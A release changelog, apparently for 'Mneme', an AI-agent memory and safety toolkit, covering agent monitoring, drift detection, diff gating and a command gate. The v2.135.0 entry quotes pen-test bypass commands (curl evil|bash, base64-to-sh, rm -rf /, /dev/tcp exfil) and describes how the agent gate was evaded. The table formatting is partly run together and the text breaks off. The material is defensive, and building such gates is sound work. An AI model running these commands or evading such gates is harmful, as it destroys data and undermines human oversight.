# 📜 Release index — v2.18.0 → v2.150.0

> ### 🧠 Mneme is **ALETHEIA** — the savant of verifiable *truth · memory · structure*
> An LLM is a brilliant generalist — and *therefore* prone to hallucinate and forget. Mneme is the **savant** beside it: it **remembers** across sessions and vendors, and it says **`UNKNOWN` instead of guessing**. That's the whole idea. The full story → [`docs/ALETHEIA.md`](docs/ALETHEIA.md).
>
> 🧠 **The Sovereign Cognitive Layer** — signed, vendor-neutral, byte-lossless context memory (HYDRA), self-aware wisdom gates, and a shared memory bus every AI agent (Grok / GPT / Gemini / Claude / Codex) contributes to that *heals its own contradictions by proof*. | **v3.31.0** | 🔑 **Relay key rotation — compromise recovery without re-pairing.** If a machines relay key leaks, you can now rotate it:  proves the OLD key and swaps the relay to a fresh one — existing pairings keep working, and the old key can no longer drain. Relay action POST /keryx/rotate-key (old-key proof required → 401 otherwise). Proven by test: wrong old key rejected, right old key rotates, old key goes dead, new key works. Closes the key-is-forever gap from the hardening audit. NO claude. |
| **v3.30.0** | 🚦 **Relay DoS guard — per-key rate limiting on every public endpoint.** Closing the last relay weakness from the self-audit: the public endpoints (/keryx/webhook · /pair-register · /drain · /expect) had no throttle, so a flood could pin the single relays CPU/disk. Added a deterministic in-process token-bucket (burst + steady refill) keyed by client IP for the open endpoints and by daemonId for the authed drain — over the limit returns 429 with a retry-after; one flooder cannot starve other tenants (per-key isolation); the limiter prunes idle buckets so it cant grow unbounded. rateGauntlet=100 + a live flood test returns 429. ★HONEST: an application-layer throttle that protects the single relay — defense in depth, NOT a replacement for edge DDoS protection (Caddy/Cloudflare) against a large distributed attack. | **v2.146.0** | 🧭 **THE INTENT GATEWAY — type free natural language, get the right Mneme command (the fix for the load-bearing weakness).** A catalog of 600+ commands is worthless if the user doesn't know them and the AI agent doesn't know they exist — all that power stays buried. Plus **SAGA auto-compensation** (reverse the executed *reversible* steps newest-first on a mid-batch failure; irreversible steps were escalated up front) and the **Living Charter** (the autonomy envelope *widens* on clean evidence, *narrows* on a regret — never auto-widens to destructive). `governorGauntlet()=100`, and the load-bearing property is **THE SAFETY INVARIANT: an irreversible / destructive / out-of-scope / over-budget / forbidden / drift-divergent / failed-shadow action can NEVER be ALLOW_AUTONOMOUS** (proven exhaustively) — plus clean→autonomous · caution→audit · batch auto-flow · breaker-trips-and-stops · budget-stops · saga-reversible-only · envelope-widens/narrows · deterministic · total; 9 unit tests; TG **108/108 (100/100)**; AUP-clean; full suite green; **live-verified** (a 6-action fleet queue → 3 autonomous, 1 audited, 1 escalated, 1 blocked, signed). CLI `mneme govern charter-init|decide|batch|amend` + MCP `mneme.govern.decide` / `mneme.govern.batch` (orchestrator-agnostic, self-attesting). **DIAKRISIS — the honest line:** the Governor **decides + sequences + escalates + compensates** — it does **not** execute the agent's work (that's the orchestrator's job; Mneme is the **kernel**, not the executor). "Fully autonomous" = the safe/reversible/in-envelope flow runs untouched while only the genuinely-irreversible escalates — autonomy bounded by a **mechanical, signed envelope**, never by Mneme self-installing. | **v2.144.0** | ⚡ **PERFCORE — Correctness-Preserving Acceleration (the High-Performance Core, Missing Links #3).** The honest version of "make it faster": a command-gate that goes faster **with a signed proof it changed zero verdicts** — not "we added a cache, trust us." CERBERUS's cost is the recursive `explode()` that decomposes a command into every reachable sub-command; but a command with **no decomposition/opacity surface** has exactly one reachable command (itself) and no opacity, so its verdict **reduces by construction to `classifyLeafRisk(cmd)`** — PERFCORE detects that class in **O(1)** (`isSimpleCommand`) and returns the leaf verdict directly, skipping the machinery; **any** doubt (a metachar / interpreter / decoder / escape) defers to the full CERBERUS path (fail-safe). `mneme perf accel` runs an **equivalence-bench** that asserts `mismatches===0` (verdicts unchanged) **and measures** the speedup, **signs it + appends to `.mneme/perf/ledger.jsonl`** (retrospective regression audit; exit 2 if any verdict changed); `mneme perf accel-history` shows the ledger over time; MCP `mneme.perf.bench`. `perfGauntlet()=100` (verdicts unchanged across the attack+benign corpus · fast-path fires · adversarial defers · a dangerous-but-simple `rm -rf /` still → destructive · memo identical · speedup measured · deterministic · total); 6 unit tests; TG **107/107 (100/100)**; AUP-clean; full suite green; **live-measured ~8–10× on a realistic 5,000-command mix** (24ms→3ms), 0 verdict changes. **DIAKRISIS — the honest ceiling:** the headline is **NOT** a fixed multiple — **correctness is GATED** (0 verdict changes, proven over the corpus), **speed is MEASURED** (reproducible + signed; varies by machine/load). The fast-path skips the DECOMPOSITION, never the danger detection. It accelerates the real gate (`classifyCommandRisk`) production-wide while `classifyCommandRiskFull` stays the always-full reference the bench proves equivalence against. **This completes all three "Missing Links" (CRUCIBLE · TELOS · PERFCORE)** — next: THE AGENT GOVERNOR capstone. Tag `v2.144.0`. |
| **v2.143.0** | 🧭 **TELOS — Mission-Drift Detection (Context Forensics): catch an agent slowly straying from its mission, before the drift becomes damage.** The "Missing Links #2". Most agent-monitoring is a single planned-vs-actual snapshot (that's OVERSHOOT); the genuinely novel move — **treat the agent's action stream as a TIME SERIES and run a statistical-process-control EWMA control chart over it.** SPC is how factories catch a process drifting out of spec, and an EWMA chart is specifically tuned to catch *small, persistent* shifts — exactly "straying a little at a time." The per-action signal is **deterministic** (off-scope files · off-topic vs the mission vocabulary · risk-class weight); the control limit is derived from the agent's **own early-on-mission baseline**; crossing the upper control limit = out of control → **STABLE / DRIFTING / DIVERGENT / UNKNOWN** + the first-breach turn + an ASCII control chart. `mneme telos --mission "refactor auth" --scope "src/auth/**" --actions log.jsonl` (exit 2 on DIVERGENT) + MCP `mneme.drift.analyze`. **`driftGauntlet()=100` is itself an A/B test:** an on-mission stream is STABLE ∧ a progressively-straying stream is DIVERGENT ∧ score(B) > score(A) by a margin ∧ the first breach turn is detected ∧ a stream that **returns** to mission has its EWMA **decay** (recovery lowers the score) ∧ thin data abstains to UNKNOWN ∧ the off-mission signal is sound ∧ the control-limit math holds ∧ deterministic ∧ total; 7 unit tests; TG **106/106 (100/100)**; AUP-clean; full suite green; **live-verified** (`▁▁▁▁❗❗❗❗❗❗` — 4 on-mission turns, breach at turn 5, baseline 0.097 → 0.87). **DIAKRISIS — the honest ceiling:** it measures how far recent behaviour moved from the baseline with a *principled* control limit — **NOT** mind-reading and **NOT** a prediction of the future; deterministic signals only, abstains on thin data, never flags DIVERGENT below the minimum action count. Composes with MISSION_RECORDER (telemetry) and is distinct from OVERSHOOT (one-shot) and REGRET (outcome calibration). Tag `v2.143.0`. |
| **v2.142.0** | 💎 **CRUCIBLE — the File-level Settlement Gate (shadow build/test before the real disk is touched).** The most dangerous moment in "let an AI agent edit my repo" is the write to disk. CRUCIBLE inserts a gate: an AI's diff is applied in a **shadow `git worktree`** (which shares `.git` — cheap, no full copy, and *not* a kernel-space sandbox — the rejected-kernel-sandbox → file-level-shadow-copy call was correct), **built + tested THERE** with your own verify command, and merged to the real disk **only if the shadow verification PASSES** — with an Ed25519-signed receipt either way. It's *proof-carrying shadow execution*: a reviewer/CI trusts the RESULT ("built + tested green in a shadow, then merged"), and a failing diff **never reaches the real tree**. `mneme crucible --diff <patch> --verify "npm test" [--merge] [--review]` (exit 2 if not merged); MCP `mneme.crucible.settle`. The load-bearing property is the **SAFETY INVARIANT** `realTreeWritten ⟺ verdict===MERGE`, proven in `crucibleGauntlet()=100` across exit codes 0/1/2/127/-1/255/137 (pass→MERGE+write · fail→ROLLBACK+no-write · review-mode never writes · any error fails CLOSED · plan extracts touched paths · failure brief pulled from output · deterministic · total) **and verified live** (PASS→MERGE dry-run, FAIL→ROLLBACK, real tree untouched, no leftover worktrees). 7 unit tests; TG **105/105 (100/100)**; AUP-clean; full suite **20,439** green. **DIAKRISIS — the honest ceiling:** it proves *your* build/test passed in a shadow with the diff applied — **NOT** that the code is bug-free (it is exactly as strong as your verify command) and **NOT** a security sandbox (a malicious build script still executes — pair it with the HEPHAESTUS command gate). The mechanical guarantee is precise: the real tree is written iff the shadow verdict is MERGE. Tag `v2.142.0`. |
| **v2.141.0** | 👻 **CODE HAUNTING (Git Telepathy) — make the ghost of the commit that last touched a region audible.** A monitor tells you *"`paymentGateway` is 40% slower"* — and a dev burns an hour running `git blame`, reading old commits, and guessing why it was written that way. `mneme haunt <file> [--line a-b] [--symptom "slow under load"]` does that dig instantly: it gathers real git facts and returns one plain-language report — **who** changed it, **when** (age in days), the **intent** they recorded (*"quick fix for the flash sale, will revisit"* / *"แก้ขัดไปก่อน"* — detected in **EN *and* TH**), the **safeguards it lacks** for your symptom (no caching · no timeout · `await` inside a loop · unbounded query), and the **team knowledge already shared** about that area (pulled from the Cortex, so the right tip surfaces *just-in-time*). MCP `mneme.haunt.investigate`; exit 2 on a HAUNTED verdict. `hauntGauntlet()=100` (extracts a temp-fix intent EN ∧ TH · flags a missing cache / await-in-loop on a perf symptom · resolves last-touched author+subject+short-hash · computes age · UNKNOWN with no fabricated author on empty history · CLEAR on a recent safeguarded commit · surfaces team knowledge · never over-claims causation · deterministic · total); 7 unit tests; TG **104/104 (100/100)**; AUP-clean; full suite green. **DIAKRISIS — the honest ceiling:** HAUNT **surfaces + correlates** real recorded git facts + intent phrases — a candidate to **look at**, **NOT** a proven cause and **NOT** fortune-telling; the missing-safeguard flags are *lexical signals*, not a static-analyzer's proof; with no history it abstains to **UNKNOWN** (it never invents an author or a reason). The other two pieces of the "Git Telepathy" idea were **already shipped** and are honestly *not* rebuilt: the incremental no-rescan index is `index-auto` (diff-only, merkle, ~200ms after commit), and just-in-time knowledge sharing is the Cortex/osmosis — HAUNT is the missing **synthesis** that makes them audible at the moment of a symptom. Tag `v2.141.0`. |
| **v2.140.0** | 💎 **REGRET ORACLE — signed, cross-vendor regret calibration (diamond 3 of 3, the last).** The seductive-but-dishonest version of this feature is "predict whether THIS edit will be regretted" — fortune-telling a model can't do. So the Regret Oracle does the honest, falsifiable thing: it's **backward-looking**. You feed it real recorded **outcomes** (an edit's signals + whether it was later **reverted / its test failed**), and it builds a per-signal **base-rate table** with a **Wilson 95% interval**. To score a new edit it reports the **Wilson LOWER bound** of the riskiest matching signal — *"edits like these were regretted at LEAST this often, here, with this much support"* — and **abstains to UNKNOWN** when no signal has enough samples. It never says *"will"*, never claims causation, and a thin/under-measured signal scores **LOW by construction** (the lower bound stays near zero) — so it **cannot be gamed into a scary number**. **Cross-vendor:** outcomes carry a `vendor:<x>` signal, so the same table answers *"which vendor's edits get reverted more, here"* — measured, not asserted. It unifies with the existing `mneme regret` (which lists reverted/hotfixed commits — the raw outcome source): `mneme regret` (the lister, unchanged) · `regret score --diff -` (derives signals via **PCE**, exit 2 on HIGH) · `regret record --regretted` · `regret vendors`; MCP `mneme.regret.score` / `mneme.regret.record` (self-attesting). `regretGauntlet()=100` (proven-risky → HIGH · proven-safe → LOW · abstains UNKNOWN under low support *even at a 100% point rate* · lower bound conservative · Wilson tightens with data · drivers sorted by proven risk · cross-vendor comparison · note says "historical base rate" not "will" · deterministic · total); 7 unit tests; TG **103/103 (100/100)**; AUP-clean; full suite green. **DIAKRISIS — the honest ceiling:** a calibrated historical base rate with a confidence interval, **NOT** a prediction of a specific future and **NOT** a causal claim — correlation in your own revert/test history is the whole signal, and the Wilson LOWER bound deliberately reports what is *proven* risky rather than a hopeful point estimate. **This closes all three diamonds (ELLEIPSIS · PCE · REGRET) and the three membrane pillars (STELE · AXIA · Activation Cortex).** Tag `v2.140.0`. |
| **v2.139.0** | 💎 **PCE — Proof-Carrying Edit (diamond 2 of 3): a signed certificate that travels with an AI's diff.** Proof-carrying code (Necula, 1996) made a binary carry a *machine-checkable proof* of its safety properties, so the host trusts the **proof, not the producer**. PCE does that for an AI's *diff*: before the edit is applied/committed, it's analysed **statically** and a **NOTARY-signed passport** is attached stating exactly what it does and does **not** do — which paths it touches, whether every path stays inside a declared `--scope` (out-of-scope ⇒ **BLOCK**), the dangerous primitives it introduces (`eval` / `childProcess` / `fsDelete` / `network` / `dynamicImport`), its add/delete balance + a mass-deletion flag, and whether it adds a secret-looking literal (⇒ **BLOCK**) — verdict **PASS / REVIEW / BLOCK**. A reviewer or CI **verifies the passport offline**: it re-derives the properties from the diff and checks they match the signed claim, so it trusts the **analysis** without re-running it or trusting the author — and tampering with **either** the diff (hash mismatch) **or** the certificate (properties/verdict mismatch) is caught. `git diff \| mneme pce --scope "src/**" --forbid network` (exit 2 on BLOCK) · `mneme pce verify --passport p.json`; MCP `mneme.pce.certify` / `mneme.pce.verify` (self-attesting). `pceGauntlet()=100` (parses a diff · detects out-of-scope · allows in-scope · inventories introduced primitives · catches an added secret · flags mass deletion · BLOCKs a forbidden primitive · verify catches a tampered diff · verify catches a forged cert · verify accepts a genuine pair · deterministic · total); 6 unit tests; TG **102/102 (100/100)**; AUP-clean; full suite green. **DIAKRISIS — the honest ceiling:** this is **static lexical+structural** analysis of a unified diff — it proves *declared, checkable, falsifiable* properties (scope-containment, the primitive inventory, add/delete balance, secret literals), **NOT** total runtime safety and **NOT** a theorem prover. The value is the **signed, offline-verifiable binding of analysis ⇄ this exact diff**; scope/secret/balance are exact, the primitive inventory is a signal to LOOK (a novel obfuscation can still hide a primitive from a lexical scan). A model vendor won't ship this — it surfaces what *its* model's edit touches/sneaks in, on the **buyer's** side of the table. (Diamond 3 — Regret Oracle — next.) Tag `v2.139.0`. |
| **v2.138.0** | 💎 **AXIA — the signed, offline-verifiable VALUE LEDGER (membrane pillar 2).** Pillar 1 (STELE) made Mneme's capabilities *knowable + provable*; AXIA makes its *value* the same. Every other "AI ROI dashboard" is marketing — it invents a "$2.4M of breaches prevented" figure no one can check. AXIA refuses that on principle and ships the honest substrate underneath: **one hash-chained, Ed25519-signed ledger that fuses the value events Mneme's organs actually produced** — tokens saved (treasury), destructive commands **GATED** (HEPHAESTUS/CERBERUS), secrets redacted (egress), injections neutralized (firewall), claims corrected (savant/gephyra), omissions flagged (elleipsis) — into a number a CFO / CISO / **insurer** / auditor verifies *with a public key, without trusting Mneme*. `mneme axia [--price-per-1k]` (signed summary, USD from tokens-saved × **your** rate only) · `mneme axia record --kind … --source …` (organs accrue events from normal use); MCP `mneme.axia.summary` / `mneme.axia.record` (self-attesting). `axiaGauntlet()=100` (chain verifies offline · tamper localized to the exact seq · per-kind counts correct · **USD only from the user-supplied rate** (null otherwise) · **no damage-$ field** · counts say "GATED" not "attacks prevented" · deterministic · total); 7 unit tests; TG **101/101 (100/100)**; AUP-clean; full suite green (845 files / 20,370 tests). **DIAKRISIS — this is exactly where vaporware lives, so the honesty line IS the moat:** every count is a *fact of an event that happened*, signed — **NOT** "attacks prevented" (a gate can be a false-positive co-sign, and you cannot prove what an un-run command would have done) and **NEVER** "$X of damage prevented" (an unprovable counterfactual). The only dollar figure is tokens-saved × the price-per-1k you supply, on the same basis as the treasury. (Pillar 3 — the activation membrane — next.) Tag `v2.138.0`. |
| **v2.137.0** | 🗿 **STELE — the signed, merkle-rooted, delta-syncable capability inscription (membrane pillar 1).** Two structural failures keep an agent from using Mneme: it doesn't know a capability exists, or it holds a stale manifest. Today's "fix" — a giant manifest dumped into CLAUDE.md — goes stale, costs O(all-tools) tokens every boot, and proves nothing about being current or complete (an OpenAPI doc / MCP tools-list is the same dumb snapshot). STELE fixes it the way git fixes large trees: every capability is a **content-addressed leaf** rolled into a **merkle root** (tamper-evident — edit one capability and the root changes); an agent holding root R asks for the **delta** vs current — **0 tokens if the roots match** (provably up-to-date), else **only the added/changed/removed leaves** (O(delta), not O(599 tools)); and the root is NOTARY-signed, so *"I hold the latest, complete surface"* is a checkable claim. `mneme stele` (root) · `--held <root>` (delta) · `--verify <root>` (freshness); MCP `mneme.stele.sync { root, leaves }` (self-attesting). `steleGauntlet()=100` (root deterministic + order-independent · changes on edit/add · 0-token delta on match · delta returns ONLY changed · detects removed · detects a tampered held leaf · delta cheaper than full · verify catches stale · deterministic · total); 8 unit tests; TG **100/100**. **DIAKRISIS:** the win is the **delta-sync + the merkle freshness/completeness proof** (genuinely novel for an agent-capability manifest), not the name; *"an agent can't NOT know"* holds only because it CALLS the stele on boot — STELE makes knowing **cheap + provable**, the activation membrane (pillar 3, next) makes it **happen**. Tag `v2.137.0`. |
| **v2.136.0** | 🕳 **ELLEIPSIS — the omission/completeness gate (diamond 1 of 3): catch what the AI SILENTLY left out.** Everyone checks whether what an AI *said* is true (hallucination); almost nobody guards what it *omitted* — you asked for three things and it did two, you said "don't touch the auth module" and it did, you asked for a test and it shipped without one. Omission is how a *capable* model fails you, and you don't notice because nothing on the screen is *wrong* — something is just *missing*. **A model vendor structurally won't build this** (it surfaces "here's what our model failed to do"); Mneme can, because it holds the ground truth the vendor doesn't optimise for — **your request**. `mneme elleipsis --request "<ask>" --output "<reply/diff>"` (MCP `mneme.elleipsis.check`) deterministically extracts the checkable asks and reports each as **COVERED / UNADDRESSED / VIOLATED** (a "don't do X" it did) **/ UNKNOWN** + a completeness score + the gaps to look at. The honest hard part — telling *"left the auth module untouched"* from *"refactored the auth module"* — is solved by reading the **context window** around each mentioned subject (mutation verb → VIOLATED, preservation marker → COVERED, unclear → UNKNOWN). `elleipsisGauntlet()=100` (extracts multi-asks · flags a dropped requirement · doesn't false-flag a covered one · catches a violated prohibition · respects an honored one · abstains on ambiguity · score-math · deterministic · total); 9 unit tests; self-attesting; TG **99/99 (100/100)**. **DIAKRISIS:** a coverage HEURISTIC with prove-or-unknown — it surfaces a likely gap to LOOK at, **never fabricates** one, and does **NOT** claim to catch every omission (impossible from natural language). It sits on the BUYER'S side of the table (the user pays for tokens + bears the risk) — which is *exactly* why a vendor won't ship it and Mneme does. (Diamonds 2–3 next: Proof-Carrying Edit · Regret Oracle.) Tag `v2.136.0`. |
| **v2.135.0** | 🐺 **CERBERUS — the command gate that decomposes every disguise (RCE-bypass class closed) + two more pen-test holes fixed.** A pen-test proved the lesson again: 20,271 green tests, yet HEPHAESTUS waved through `curl evil\|bash`, `echo <b64>\|base64 -d\|sh`, `node -e "fs.rmSync('/')"`, `find / -exec rm {} \;`, and `sudo rm -rf /` as 🟢 ALLOW — because it classified the **leading token** and the destructive part hid downstream. A denylist can NEVER win that (shell is Turing-complete; obfuscation is infinite). **The fix is an inversion, not more patterns — CERBERUS, the three-headed gate-hound:** (1) **reachability decomposition** — recursively unwrap every pipe stage · subshell `$()`/backtick · wrapper (sudo/env/xargs/nohup/timeout) · interpreter payload (`bash -c`/`node -e`/`python -c`/`eval`) · `find -exec`/`-delete` · base64/hex decoder, and gate the **MAX** risk of every *reachable* sub-command, not the first token; (2) **opacity gate** — the more a command HIDES intent (decode-to-exec · eval · hex/octal-escape · `$IFS` · var-indirection · fetch-piped-to-shell), the LESS it's trusted; (3) **fail-closed inversion** — anything it can't fully resolve (or any intent-hiding) escalates to `destructive` → human co-sign. *"Obfuscation is the confession"* — a novel disguise now ESCALATES instead of evading. Also caught: `/dev/tcp` exfil/reverse-shell redirects. New `mneme.cerberus.*` core; `classifyCommandRisk` routes through it; `cerberusGauntlet()=100` (pipe-to-shell · fetch-and-exec · encoded-exec · interpreter-eval · find-exec/-delete · wrapper-hidden · substitution · indirection · hex-escape · fails-closed-on-unbalanced · allows-benign-pipes · allows-benign-reads · deterministic · total) bound to the real gate; 12 unit tests over the full attack corpus + **E2E tests that spawn the real binary** on each bypass (the missing layer). **Plus two more pen-test findings fixed:** **#2 COERCION under-detection** — `audit-pulse` now catches the un-contracted fake-user-voice ("say yes **and I will** handle the rest") and the pre-staged auto-action shape ("QUEUED: … (pre-approved)"); **#4 SKELETON KEY blind to its own host** — MCP discovery now scans Claude Code (`~/.claude.json` incl. per-project `projects[*].mcpServers`, `<repo>/.mcp.json`) + Cursor/VS Code `mcp.json`, so it no longer reports "0 servers" on a machine running Claude Code. (#3 GEPHYRA over-label + #5 daemon-runaway were already fixed in v2.134.) `railGauntlet`/`policyGauntlet`/`firewallGauntlet`/`bootGauntlet` still 100; TG **98/98 (100/100)**; full suite green. README gains an honest **Security** section. **DIAKRISIS — the honest ceiling:** CERBERUS is **NOT "100% unbypassable"** (no command gate can be — shell is Turing-complete; a kernel-level syscall guard or a true ms-sandbox are NOT things a user-space CLI can honestly ship). What it provably does: closes the pipe-to-shell / interpreter / encoded / indirection obfuscation family **and fails closed** so unknown disguises escalate rather than slip — decision-time defense-in-depth, far ahead of a denylist, with a signed audit trail. | **v2.134.0** | 🛡 **Two load-bearing gates were lying under a green suite — fixed at root, + the missing E2E test layer that let them hide (the "green suite ≠ safe road" release).** Real bugs found by hand-testing the *documented* invocation paths: **(1) HEPHAESTUS `heph cross --command "rm -rf /"` returned `ALLOW/write`** — the exact path Rule 13 + `--help` + MCP `{command}` tell agents to use silently let destructive commands (`rm -rf`, `git push --force`, `DROP TABLE`) through. It errs only to the safe side — never upgrades a falsehood. **(3) Daemon-runaway hardening:** the daemon singleton was check-then-write (TOCTOU) — two concurrent starts could both win → pile-up. Now the pid file is created with **`O_EXCL`** (atomic; exactly one winner, stale files reclaimed once). **(4) The fix that prevents recurrence — `tests/e2e/gate-cli-paths.test.ts`:** spawns the **real CLI binary** on the documented gate invocations (the layer the suite lacked — it tested the classifier in-process/positionally but never the `--flag` path a user actually runs). 8 e2e cases, all green; 66 gephyra/apoptosis/heph unit tests green; TG 97/97; full suite green. | **v2.79.0** | 🪪 **NOTARY — portable, offline-verifiable proof-of-provenance (the TRUST FABRIC spine + Mneme's first asymmetric-crypto primitive).** The strategic insight: every 2026 agent standard (MCP / A2A / x402 / ERC-8004) answers *how agents connect / talk / pay / identify* — none answers *"can you trust what an agent said/remembered, and prove it retroactively?"* That **Memory + Truth + Audit** axis is orthogonal to all connectivity standards and structurally un-ownable by any single vendor (a model can't score its own honesty; a vendor can't ship portable memory that flows to a competitor) — only an independent player can own it. NOTARY is its foundation. Every prior Mneme ledger is **HMAC** (symmetric — you need the secret to verify, useless for a third party). NOTARY adds **Ed25519 signatures**: a receipt is signed with a private key and verified by ANYONE with the embedded **public key alone** — no Mneme instance, no network, no shared secret. A `NotaryReceipt` (`packages/core/src/notary/`) attests a `subject` + optional `payload` under a `kind` (claim-verdict · protocol-hop · memory-capsule · reasoning-trace · generic), survives JSON serialization, and **rejects tampering** — a flipped payload, a forged subject, a broken receiptId, or a swapped-in foreign issuer key all fail the signature. `hash-only` mode attests a payload's hash without revealing it (privacy). Receipts **chain** (`prev → receiptId`) into a tamper-evident, attributable history (`verifyChain`, optional same-issuer enforcement). It composes with the existing hash-only `mneme-receipt-protocol` via `notarizeProtocolReceipt` (old open spec + new signature). New CLI **`mneme notary issue|verify|pubkey`** (verify needs ONLY the receipt JSON + works offline) and 3 MCP tools **`mneme.notary.{issue,verify,pubkey}`**. Issuer keypair auto-generated + persisted at `.mneme/notary/issuer.key` (mode 0600; public key in `issuer.pub`); zero-dependency (Node-native Ed25519). New launch-gate probe **`probe.notary.sign_verify_round_trip`** (severity=block) proves offline verify + serialization survival + tamper/forgery rejection. **15 pinned tests** (`notary/notary.test.ts`). This is diamond #1 of the TRUST FABRIC — the shared spine the **BGP notarizing router** (route + sign MCP↔A2A↔x402↔ERC-8004 every hop), **BYOB portable memory** (your signed brain capsule across vendors), and the **AI Flight Recorder** (tamper-evident causal black box) all build on. | **v2.76.0** | 🐛 **THREE FUSION-FOUND BUGS FIXED + CHRONOS docs.** **(1) 🔴 R1 — `mneme verify` REFUTED true claims (persisting since session 1).** A `library_used=X` claim absent from `package.json` was scored substrate **0** by the neutrino layer → fed the GÖDEL unsat-core → `IMPOSSIBLE_REFUTE — library_used=X is impossible (99%)`, then VACCINATED, so the Bayesian prior AUTO_REFUTE'd the true claim forever after (self-reinforcing). Root cause: **package.json is NOT authoritative** — X can be an Ollama model (`bge-m3`), a Python/other-ecosystem package, a transitive dep, or a runtime reference, and the claim's SUBJECT may be a DIFFERENT project. Fix: both `neutrinoSubstrate` and `fact_grounding` now check the lockfile + tracked source (`libraryReferencedInRepo`); referenced → 1.0/`true`, genuinely-absent → **neutral 0.5/`unverifiable` (NEVER `false` → IMPOSSIBLE)**; and the poisoned `library_used=` vaccine class is **quarantined** in `checkAgainstVaccines` + `bayesian_prior`. Now `"X uses bge-m3"` → FUSION, `"X uses <absent>"` → LIMBO/unknown — no false refute. *(Field note: the lingering CLI IMPOSSimble was a STALE-DAEMON warm-call serving pre-fix code; it clears on the daemon restart that every upgrade performs.)* **(2) 🟡 `--json` broke on Windows via cmd.exe.** `mneme <family> <action> --json '{...}'` arrived as the literal `'{...}'` (cmd doesn't strip single quotes) → JSON.parse error; the only reliable path was `node <bin>` + shell:false. Fix: a tolerant `parseJsonArg` — strips one layer of cmd-left surrounding quotes + JSON5-lite-repairs single-quoted / unquoted-key JSON. **(3) bge-m3 Ollama embed `HTTP 500 / NaN` on a specific input** (e.g. *"…may encrypt where feasible…"*) aborted the whole index. Fix: the Ollama embedder now **retries 5xx**, **validates against NaN**, **isolates a bad input** (batch→singular), **sanitizes + retries**, and as a last resort substitutes a **same-dimension deterministic vector** (counted via `embedStats().degraded`, never silently faked) so one bad chunk never breaks a run. **(4) 🦴 ROOT-CAUSE EBUSY fix — the DECLARED-HANDLE LEASE (world-first).** The 3 broken preinstalls (v2.75.0/.1/.2) taught us the inline `node -e` preinstall must be cmd.exe-safe (< 8000 chars, ZERO double-quotes), which ruled out the PowerShell cmdline-match reaper in the inline. v2.76.0 fixes the *root cause* instead: the **bridge + nucleus daemon now register their heartbeat WITH `holdsPaths`** — the exact native DLLs (`libvips-42.dll` / sharp `.node`) the process holds, via `phoenix.dllExtraction.heldNativeLibs()`. The cmd.exe-safe inline PID-lease reap then kills every registered daemon by exact PID AND runs the deterministic **Handle-Oracle on the EXACT declared handles** (union with static candidates) — covering any install layout (nvm / volta / custom prefix) with **no risky cmdline-match in the inline**. A process declaring the OS handles it holds so the next installer reclaims them deterministically is, as far as we know, unprecedented. **Brutal reverse-engineer tests** (`v76_1-daemon-reap.test.ts` ×8): spawn a REAL node child → lease it with `holdsPaths` → prove the reaper kills the real PID + Handle-Oracles the declared path + the handle is free after; Handle-Oracle determinism (exits the instant the lock frees); `heldNativeLibs` never declares a phantom path; **process-table parser FUZZ × 200** (wmic/powershell/ps never throw on garbage); + the shipped inline is asserted holdsPaths-aware + < 8000 chars + 0 double-quotes + a faithful `cmd /d /s /c` exit-0 smoke. The TG probe `probe.preinstall.reaps_node_daemon` now also requires the `holdsPaths` harvest. **Front-page slimming:** the README CHRONOS + PROTOPLASM blocks are collapsed to **one-line summaries + new-tab links** — the long write-ups move to dedicated pages (`docs/chronos/README-EN.md` / `README-TH.md` in **EN + TH**; `docs/protoplasm/`), so the front page stays scannable and anyone who wants depth clicks through. **29 new pinned tests** (`v76_0-verify-library-fix.test.ts` ×16 + `ollama_robust.test.ts` ×5 + `v76_1-daemon-reap.test.ts` ×8). | **v2.75.0** | 🦴 **PREINSTALL REAPER — HANDLE-ORACLE + CMDLINE-MATCH + PID-LEASE (the real Windows-EBUSY node.exe fix).** Root cause: the Mneme daemon runs as `node.exe …\bin\mneme.js nucleus daemon`, so the old preinstall `taskkill /F /IM mneme.exe /T` (IMAGE-NAME kill) **never touched it** — a daemon that had loaded the OPTIONAL native libvips-42.dll (via the @huggingface/transformers→sharp opt-in path) kept that DLL memory-mapped + locked → `npm i -g mneme-ai` failed with EBUSY. (Audit confirmed sharp is NOT a default dep — only a transitive of the optional transformers — so the lock is rare, but a stale daemon from an old version still reproduces it.) **Three deterministic, pure-JS layers — zero native, zero deps:** (1) **PID-LEASE** — reads the existing `~/.mneme-global/heartbeats/*.beat` registry (`{pid, holdsPaths}`); authoritative for daemons that registered. (2) **CMDLINE-MATCH** — queries the OS process table (wmic → PowerShell CIM on Windows; `ps -eo pid=,args=` on POSIX) and kills any process whose COMMAND LINE is a Mneme daemon **even if it never wrote a heartbeat** (old version / crashed registry / deleted beat). This is the actual node.exe fix; the matcher is precise (`mneme.js`/`mneme-ai` AND `nucleus`/`daemon`/`--detach`) so it never false-positives on an editor, a one-shot verb, or the installer itself. (3) **HANDLE-ORACLE** — replaces the blind `wait(300)` with a deterministic gate: loop `fs.openSync(dll,'r+')` (exclusive on Windows) and proceed the instant the OS confirms the handle is free — proof, not hope — falling back to the v2.19.61 rename-sideways trick only if the lock genuinely persists. **Single source of truth, chicken-and-egg safe:** the logic lives in one unit-tested + SUPER-QUAN-probed module (`packages/cli/bin/preinstall-mneme.cjs`); the shipped `scripts.preinstall` is **GENERATED** from it (`scripts/gen-preinstall-inline.mjs`) as a self-contained inline `node -e` with **NO package-internal file reference** — honouring the v2.19.48/49 scar (a `node bin/foo.cjs` ref crashes the install before extraction + uninstalls Mneme from PATH) — with a drift-guard test that fails if the inline and the .cjs diverge. **TG BINDING (1 NEW, severity=block):** `probe.preinstall.reaps_node_daemon` (reads `packages/cli/package.json`: asserts inline `node -e` + no file ref + cmdline-match + Handle-Oracle markers). TG **58/58 = 100/100**, 0 drift. **21 NEW PINNED TESTS** in `packages/cli/tests/preinstall_reaper.test.ts` (P1 cmdline-match incl. the exact node.exe case + no-false-positive / P2 wmic+powershell+posix parsers / P3 selectDaemonPids / P4 Handle-Oracle exits the instant the lock frees / P5 DLL candidates + heartbeat-lease / P6 hermetic runPreinstall / P7 inline-safety + drift-guard / Q1 SUPER-QUAN transparency). `preinstall_trail.test.ts` (19) still executes the generated inline in a sandbox + verifies the HMAC trail. **LAUNCH WINDOW 🚀 T-0 GO**, coverage 100%, full regression: zero new failures. **Pattern locked**: image-name kill is blind to interpreter-hosted daemons (`node.exe …script.js`) — match the COMMAND LINE; and a tested module can still ship as a chicken-and-egg-safe inline by GENERATING the inline from it (single source of truth + drift guard). | **v2.74.0** | ⏳ **CHRONOS — TEMPORAL SELF-CONSISTENCY AS A GROUND-TRUTH-FREE HONESTY SIGNAL.** Detecting LLM honesty usually needs a ground-truth oracle — expensive, incomplete, impossible for open-ended 